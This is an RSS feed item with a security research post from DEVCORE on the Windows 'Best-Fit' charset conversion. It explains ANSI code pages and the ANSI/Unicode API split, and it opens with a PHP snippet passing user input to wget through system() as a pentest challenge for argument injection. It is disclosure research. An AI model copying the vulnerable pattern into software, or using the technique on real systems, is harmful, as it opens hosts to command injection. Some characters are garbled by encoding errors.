<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
        <title>DEVCORE Êà¥Â§´ÂØáÁàæ</title>
        <description>DEVCORE Êà¥Â§´ÂØáÁàæ - Á¥ÖÈöäÊºîÁ∑¥ÊúçÂãô„ÄÅÊª≤ÈÄèÊ∏¨Ë©¶ÊúçÂãô„ÄÅË≥áÂÆâÊïôËÇ≤Ë®ìÁ∑¥„ÄÅË≥áÂÆâÈ°ßÂïèÊúçÂãô</description>
        <link>https://devco.re</link>
        <lastBuildDate>Thu, 09 Jan 2025 20:16:03 +0800</lastBuildDate>
        <pubDate>Thu, 09 Jan 2025 20:16:03 +0800</pubDate>
        <ttl>1800</ttl>
        <atom:link href="https://devco.re/rss" rel="self" type="application/rss+xml" />


        <item>
                <title>WorstFit: Unveiling Hidden Transformers in Windows ANSI!</title>
                <description>&lt;style&gt;
    .language-plaintext {
        background-color: rgba(0, 0, 0, 0.04);
        padding: 0.2em;
        font-size: 85%;
    }

    .highlight {
        border-left: 2px solid #44D62C !important;
    }
&lt;/style&gt;

&lt;p&gt;&lt;em&gt;Author: &lt;a href=&quot;https://x.com/orange_8361&quot;&gt;Orange&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://x.com/_splitline_&quot;&gt;Splitline&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The research unveils a new attack surface in Windows by exploiting &lt;strong&gt;Best-Fit&lt;/strong&gt;, an internal charset conversion feature. Through our work, we successfully transformed this feature into several practical attacks, including Path Traversal, Argument Injection, and even RCE, affecting numerous well-known applications!&lt;/p&gt;

&lt;p&gt;Given that the root cause spans compiler behavior, C/C++ runtime and developer‚Äôs mistakes, we also discussed the challenges of pushing fixes within the open-source ecosystem.&lt;/p&gt;

&lt;p&gt;Get the latest update and slides on our website!üî• ‚Üí &lt;a href=&quot;https://worst.fit/&quot;&gt;https://worst.fit/&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Let‚Äôs imagine that: you‚Äôre a pentester, and your target website is running the following code. Can you pop a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt; with that? &lt;!-- You can have a quick try on your own. --&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://example.tld/&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;path&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wget.exe -q &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can have a quick try on your own. The PHP code uses a secure way to spawn the command. Looks a bit hard, right?&lt;/p&gt;

&lt;p&gt;Well, today, we would like to present a new technique to break through it!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;outline&quot;&gt;Outline&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&quot;#outline&quot;&gt;Outline&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#decoding-the-windows-encodings&quot;&gt;Decoding the Windows Encodings&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;#the-early-days-ansi-and-code-pages&quot;&gt;The Early Days: ANSI and Code Pages&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#the-unicode-era-utf-16&quot;&gt;The Unicode Era: UTF-16&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#the-dual-era-of-encoding&quot;&gt;The Dual Era of Encoding&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#it-was-the-best-of-fit&quot;&gt;It was the Best of Fit&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#it-was-the-worst-of-fit--the-novel-attack-surface-on-windows&quot;&gt;It was the Worst of Fit ‚Äì The novel attack surface on Windows&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;#-the-nightmare-of-east-asia---cve-2024-4577&quot;&gt;üî• The nightmare of East-Asia - CVE-2024-4577&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#-filename-smuggling&quot;&gt;üî• Filename Smuggling&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#-argument-splitting&quot;&gt;üî• Argument Splitting&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#-environment-variable-confusion&quot;&gt;üî• Environment Variable Confusion&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#the-duskor-dawnof-the-worstfit&quot;&gt;The Dusk‚Äìor Dawn‚Äìof the WorstFit&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#epilogue&quot;&gt;Epilogue&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;#mitigations&quot;&gt;Mitigations&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;decoding-the-windows-encodings&quot;&gt;Decoding the Windows Encodings&lt;/h2&gt;

&lt;p&gt;If you are a Windows user, you‚Äôre probably aware that the Windows operating system supports Unicode. This means we can seamlessly put emojis ‚úÖ, √°cc√®nted letters, ùíªùí∂ùìÉùí∏ùìé ùï§ùï™ùïûùïìùï†ùïùùï§ and CJK &lt;abbr title=&quot;CHARACTERS&quot;&gt;ÂåöÂçÑÂÖ´Â∞∫ÂÖ´Âåö„Ñí„É®Â∞∫‰∏Ç&lt;/abbr&gt; pretty much anywhere ‚Äî like file names, file contents, or even environment variables. But have you ever wondered how Windows manages to handle those non-ASCII characters?&lt;/p&gt;

&lt;p&gt;Well, to describe this, let‚Äôs dive into the history of encoding in Windows first to understand how it handles.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-early-days-ansi-and-code-pages&quot;&gt;The Early Days: ANSI and Code Pages&lt;/h3&gt;

&lt;p&gt;Windows initially used ANSI encoding, which relied on code pages such as the one shown below. It used 8 to 16 bits to represent a single character. While these mappings were effective for certain languages, they were unable to accommodate mixed or universal character sets.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Code Page&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Language&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1250&lt;/td&gt;
      &lt;td&gt;Central / Eastern European languages (e.g., Polish, Czech)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1251&lt;/td&gt;
      &lt;td&gt;Cyrillic-based languages (e.g., Russian, Bulgarian)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1252&lt;/td&gt;
      &lt;td&gt;Western European languages (e.g., English, German, French)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1253&lt;/td&gt;
      &lt;td&gt;Greek&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1254&lt;/td&gt;
      &lt;td&gt;Turkish&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1255&lt;/td&gt;
      &lt;td&gt;Hebrew&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1256&lt;/td&gt;
      &lt;td&gt;Arabic&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1257&lt;/td&gt;
      &lt;td&gt;Baltic languages (e.g., Estonian, Latvian, Lithuanian)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1258&lt;/td&gt;
      &lt;td&gt;Vietnamese&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;932&lt;/td&gt;
      &lt;td&gt;Japanese&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;936&lt;/td&gt;
      &lt;td&gt;Simplified Chinese&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;949&lt;/td&gt;
      &lt;td&gt;Korean&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;950&lt;/td&gt;
      &lt;td&gt;Traditional Chinese&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;874&lt;/td&gt;
      &lt;td&gt;Thai&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;For instance, back in the day, as a Taiwanese, if my Japanese friend sent me an article written on their Windows computer, I‚Äôd probably end up with a scrambled mess of &lt;a href=&quot;https://en.wikipedia.org/wiki/Mojibake&quot;&gt;mojibake&lt;/a&gt; because my code page 950 system couldn‚Äôt properly interpret the Japanese 932 code page.&lt;/p&gt;

&lt;p&gt;To handle different encoding needs, Windows doesn‚Äôt rely on just one type of code page ‚Äî there are actually two:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ACP&lt;/strong&gt; (ANSI Code Page): Used for most applications and system settings, such as file operations or managing environment variables. Our research here primarily focuses on this type of code page, as it significantly impacts the scenarios we‚Äôll examine.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;OEMCP&lt;/strong&gt; (Original Equipment Manufacturer Code Page): Mainly used for device communication, such as reading or writing to the console.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To check which ACP (ANSI code page) you‚Äôre using, consider these methods:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Using PowerShell&lt;/strong&gt;
    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;powershell.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OutputEncoding.WindowsCodePage&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;From the Registry&lt;/strong&gt;
    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\CodePage&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ACP&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Additionally, you might also heard of &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chcp&lt;/code&gt;&lt;/a&gt;. However, be aware that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chcp&lt;/code&gt; displays the &lt;strong&gt;OEMCP&lt;/strong&gt;  rather than the ACP, which is the focus of our research here.&lt;/p&gt;

&lt;h3 id=&quot;the-unicode-era-utf-16&quot;&gt;The Unicode Era: UTF-16&lt;/h3&gt;
&lt;p&gt;To address the limitations of code pages, Windows transitioned to Unicode in the mid-1990s. Unlike code pages, Unicode could represent characters from nearly all languages in a single standard.&lt;/p&gt;

&lt;p&gt;Initially, Windows used UCS-2 for Unicode but soon upgraded to &lt;strong&gt;UTF-16&lt;/strong&gt;, which uses 16 bits for most characters and expands to 32 bits for rarer ones (e.g., emojis, ancient scripts). Windows also switched to &lt;strong&gt;wide characters&lt;/strong&gt; for core APIs like file systems, system information, and text processing.&lt;/p&gt;

&lt;p&gt;Now you might be wondering: Hey, what about the most popular Unicode encoding nowadays: &lt;strong&gt;UTF-8&lt;/strong&gt;? Well, it‚Äôs already there, but still in a sort of beta phase. For most languages, the UTF-8 feature sadly isn‚Äôt enabled by default.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-dual-era-of-encoding&quot;&gt;The Dual Era of Encoding&lt;/h3&gt;

&lt;p&gt;Even though Unicode became the backbone of Windows, Windows still need to do what they always do: backward compatible. They still need to support the old ANSI code pages. To achieve this, Windows implemented two different versions of APIs:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ANSI APIs&lt;/strong&gt;: A Windows code page version with the letter ‚ÄúA‚Äù postfix used to indicate ‚ÄúANSI‚Äù. For example, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;&lt;/a&gt; function.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Unicode APIs&lt;/strong&gt;: A Unicode version with the letter ‚ÄúW‚Äù postfix used to indicate ‚Äúwide (character)‚Äù. For example, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablew&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableW&lt;/code&gt;&lt;/a&gt; function.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This approach allows developers to easily obtain their desired data format by simply switching between the A-postfix and W-postfix APIs.&lt;/p&gt;

&lt;p&gt;It sounds perfect ‚Äì But wait, so how can a wide character UTF-16 string also be in the ANSI format? Aren‚Äôt they fundamentally different?&lt;/p&gt;

&lt;p&gt;To illustrate this, let‚Äôs explore an example. Imagine we‚Äôre on an English (&lt;strong&gt;Windows-1252&lt;/strong&gt; code page) system with an environment variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ENV=Hello&lt;/code&gt; stored in the system. The data is internally stored as &lt;strong&gt;UTF-16&lt;/strong&gt; (wide character format), but we can retrieve it using both Unicode and ANSI APIs:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Unicode API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableW(L&quot;ENV&quot;)&lt;/code&gt; ‚≠¢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;L&quot;Hello&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4800 6500 6C00 6C00 6F00&lt;/code&gt; in UTF-16LE).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ANSI API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA(&quot;ENV&quot;)&lt;/code&gt; ‚Äî &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlUnicodeStringToAnsiString&lt;/code&gt; ‚≠¢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Hello&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;48 65 6C 6C 6F&lt;/code&gt; in ANSI).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For the &lt;strong&gt;Unicode API&lt;/strong&gt;, there‚Äôs no problem‚ÄîUnicode in, Unicode out, with no conversion needed. For the &lt;strong&gt;ANSI API&lt;/strong&gt;, Windows applies an implicit conversion by calling &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-rtlunicodestringtoansistring&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlUnicodeStringToAnsiString&lt;/code&gt;&lt;/a&gt; (or sometimes &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WideCharToMultiByte&lt;/code&gt;&lt;/a&gt;) to convert the original Unicode string to an ANSI string. Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Hello&quot;&lt;/code&gt; consists only of ASCII characters, everything works perfectly and as expected.&lt;/p&gt;

&lt;p&gt;But what happens if the environment variable contains a more complex string, like &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;‚àöœÄ‚Å∑‚â§‚àû&lt;/code&gt;&lt;/strong&gt;, with a lot of non-ASCII characters?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Unicode API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableW(L&quot;ENV&quot;)&lt;/code&gt; ‚≠¢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;L&quot;‚àöœÄ‚Å∑‚â§‚àû&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1a22 c003 7720 6422 1e22&lt;/code&gt; in UTF-16LE).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;strong&gt;Unicode API&lt;/strong&gt; correctly returns the original string as we expected.&lt;/p&gt;

&lt;p&gt;Now, what happens with the ANSI API? Are you able to guess the result?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ANSI API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA(&quot;ENV&quot;)&lt;/code&gt; ‚Äî &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlUnicodeStringToAnsiString&lt;/code&gt; ‚≠¢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;vp7=8&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;76 70 37 3D 38&lt;/code&gt; in ANSI) ü§Ø&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Yep, the output is &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vp7=8&lt;/code&gt;&lt;/strong&gt;. A strange result, right? I guess you can‚Äôt even figure out the connection between the original characters and their character codes!&lt;/p&gt;

&lt;p&gt;This bizarre transformation is what‚Äôs known as &lt;strong&gt;‚ÄúBest-Fit‚Äù&lt;/strong&gt; behavior. As a result, the original string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;‚àöœÄ‚Å∑‚â§‚àû&lt;/code&gt; transforms into a nonsensical &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;vp7=8&quot;&lt;/code&gt;. This behavior highlights the pitfalls of relying on ANSI APIs when handling non-ASCII characters.&lt;/p&gt;

&lt;p&gt;And actually, it‚Äôs not just when using Windows APIs directly ‚Äî this behaciour also occurs when using non-wide-character version CRT (C runtime) functions like &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getenv&lt;/code&gt;&lt;/a&gt;. Surprisingly, even when you receive arguments or environment variables through a seemingly straightforward non-wide-character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function like:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test_env = %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test_env&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;argv[%d] = %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The same Best-Fit behavior applies to both the arguments and the environment variables. Here‚Äôs what happens when we run this code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This happens because, during compilation, the compiler inserts several functions and links the CRT DLLs for you, which internally rely on ANSI Windows APIs. As a result, the same Best-Fit behavior is triggered implicitly.&lt;/p&gt;

&lt;p&gt;We keep talking about Best-Fit, but how does this quirky behavior actually work in the end?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;it-was-the-best-of-fit&quot;&gt;It was the Best of Fit&lt;/h2&gt;

&lt;p&gt;In Windows, ‚ÄúBest-Fit‚Äù character conversion is a way the operating system handles situations where it needs to convert characters from UTF-16 to ANSI, but the exact character doesn‚Äôt exist in the target code page.&lt;/p&gt;

&lt;p&gt;For instance, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;‚àû&lt;/code&gt; (&lt;a href=&quot;https://www.compart.com/en/unicode/U+221E&quot;&gt;U+221E&lt;/a&gt;) symbol isn‚Äôt part of the &lt;a href=&quot;https://en.wikipedia.org/wiki/Windows-1252#Codepage_layout&quot;&gt;Windows-1252 code page&lt;/a&gt;, so Microsoft decided to map it to the ‚Äú&lt;strong&gt;closest&lt;/strong&gt;‚Äù character‚Äî&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt; (&lt;a href=&quot;https://worst.fit/mapping/#CP%3A1252%20FROM%3A0x221e&quot;&gt;üîç&lt;/a&gt;). Uh, okay. Yeah I guess they kinda look similar, but I thought they should be still completely different things‚Ä¶&lt;/p&gt;

&lt;p&gt;Anyway, obviously there‚Äôs no strict formula for Best-Fit mapping ‚Äì what Microsoft do is more about making characters look, or even ‚Äúfeel‚Äù somewhat alike.&lt;/p&gt;

&lt;p&gt;Also, different language configurations (code pages) handle mappings differently. For instance, the yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00A5&lt;/code&gt;) is mapped to a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;) on the Japanese (932) code page, to a ‚ÄúY‚Äù on the Central European (1250) code page, and remains unchanged on most other code pages. This variability will play a significant role in how exploits behave across different system settings.&lt;/p&gt;

&lt;p&gt;If you‚Äôre curious about the specifics, you can check out our &lt;a href=&quot;https://worst.fit/mapping/&quot;&gt;Best-fit Mapping Grepper&lt;/a&gt; tool or dive into the raw mapping data on &lt;a href=&quot;https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/readme.txt&quot;&gt;Unicode.org&lt;/a&gt; by yourself.&lt;/p&gt;

&lt;p&gt;Interestingly, during our research we found that this &lt;strong&gt;Best-Fit&lt;/strong&gt; behavior was already mentioned back in Black Hat USA 2009 during Chris Weber‚Äôs presentation, &lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-SLIDES.pdf&quot;&gt;‚ÄúUnicode Security‚Äù&lt;/a&gt;. However, he only briefly touched on how this feature could be exploited to bypass simple blacklist.&lt;/p&gt;

